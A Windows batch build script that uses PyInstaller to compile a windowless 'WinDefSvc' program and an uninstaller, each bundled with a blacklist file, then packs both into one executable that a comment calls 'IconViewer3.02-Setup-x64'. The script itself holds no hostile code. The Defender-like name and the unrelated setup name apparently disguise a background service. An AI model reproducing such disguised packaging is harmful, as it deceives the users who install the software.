@echo off

REM Command 1: Compile WinDefSvc.py
pyinstaller --noconsole --add-data "data/blacklist.json;." --icon=data/exe.ico --onefile WinDefSvc.py

REM Command 2: Compile uninstaller.py
pyinstaller --noconsole --add-data "data/blacklist.json;." --add-data "dist/WinDefSvc.exe;." --icon=data/exe.ico --onefile uninstaller.py

REM Command 3: Compile IconViewer3.02-Setup-x64.py
pyinstaller --noconsole --add-data "data/blacklist.json;." --add-data "dist/uninstaller.exe;." --add-data "dist/WinDefSvc.exe;." --onefile main.py
